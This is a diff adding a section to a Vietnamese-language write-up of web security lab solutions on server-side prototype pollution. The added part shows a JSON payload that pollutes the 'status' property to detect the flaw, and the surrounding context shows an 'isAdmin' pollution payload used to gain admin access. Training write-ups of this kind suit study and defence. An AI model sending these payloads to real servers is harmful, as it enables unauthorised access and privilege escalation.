@@ -111,6 +111,24 @@ Như vậy, có thể dự đoán rằng server side có lỗ hổng prototype p
 Nhận thấy trong response có `"isAdmin":false`. Khi đó, ta hoàn toàn có thể ghi đè lên thuộc tính này bằng cách thêm `"__proto__":{"isAdmin":true}` vào trong payload. Sau khi submit, ta refresh browser và thấy "Admin panel" xuất hiện. Xóa user carlos, bài lab được giải.
 
 # 7. Detecting server-side prototype pollution without polluted property reflection
+Đăng nhập với credentials wiener:peter, ta thấy request `POST /my-account/change-address` nhận vào một chuỗi JSON và trả về JSON trong response. 
+
+Nhận thấy, khi submit với tham số `country` không hợp lệ, response sẽ trả về lỗi.
+
+Để exploit prototype pollution với status code, ta thử cấu hình phần body như sau:
+```
+{
+    "address_line_1":"Wiener HQ",
+    "address_line_2":"One Wiener Way",
+    "city":"Wienerville",
+    "postcode":"BU1 1RP",
+    "country":"UK",
+    "sessionId":"cgYDvt1jgVprQ1RMlbmtAwUCj6qLCfeK",
+    "__proto__":{"__proto__":{"status":599}
+    }
+}
+```
+Sau khi submit, kết quả trả về bình thường. Tiếp đó ta thử submit một response lỗi, nhận thấy status code là 599. Như vậy, ta detect được website có lỗi prototype pollution, bài lab được giải.
 
 # 8. Bypassing flawed input filters for server-side prototype pollution
 
